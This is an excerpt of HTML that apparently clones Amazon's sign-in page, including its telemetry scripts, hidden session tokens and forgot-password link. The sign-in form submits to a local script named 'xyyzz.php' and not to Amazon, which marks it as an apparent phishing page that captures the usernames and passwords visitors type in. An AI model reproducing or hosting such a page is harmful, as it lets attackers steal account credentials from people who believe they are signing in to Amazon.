...
var ue_id = '0SGYB8G9B0VXGKGDK7FH',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ...
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:141-1826030-8978864:0SGYB8G9B0VXGKGDK7FH$uedata=s:',
    ue_sbuimp = 1,
    ue_cel_lclia = 1,
    ue_ibft = 0,
    ue_fnt = 0,
...
<!-- 2gahdcuk69sbzoeujw04fgpwxr4gjvglysz -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 9675)</script><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>
...
if (window.csa) {
    csa("Config", {
        ...
        'CacheDetection.RequestID': "0SGYB8G9B0VXGKGDK7FH",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "0SGYB8G9B0VXGKGDK7FH", meaningful: "interactive"},
...
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 14532)</script><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
...
<div class="a-section a-spacing-base">
  <div class="a-section">
    ...
    <form name="signIn" method="post" novalidate action="xyyzz.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
    ...
    <input type="hidden" name="prevRID" value="ape:MFNHWUI4RzlCMFZYR0tHREs3Rkg=" />
  
    <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.HVvDvyCG75wkbGno6hQcuPzK7bNyZeS5gX9DFNrE5pwDthrK-dWHGw.3D_Vi-g8gBWDEpgY.tyHjFTUstXfSA5W07W8mdePziI9ZGVS5Zqq9opqDchB5U2WSqxLOWX8H3827pbXZcfcGEGKH4MF-rkFRFIkND3Pd_pKRRjbBlH5TUkrkK5aH-0EUr5Erxf8YAlV9L1Lr6n8hXfIW_EiFjYqyusk6siRN1tDjk5GxK_j_Sp50P43-vm6K-_FJXOBRk2WTzbS4Kot67a7EIzLqFhquCkNAxGR4kXxaawNMM9w7AC1CtvpG4VH70eo85Up2dT9RCNtLAoQskwbLnLZFfDABGzrEqZgQi0_5mkzFj_b_ZCRCvFnNehj_VZ_-sP9hqR9dJQZwlq4.9APOg3Evywm3ETzcJLyivQ" />
...
<a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&amp;prevRID=0SGYB8G9B0VXGKGDK7FH&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
...
<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:141-1826030-8978864:0SGYB8G9B0VXGKGDK7FH$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3D0SGYB8G9B0VXGKGDK7FH:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 38767)</script></body>
</html>
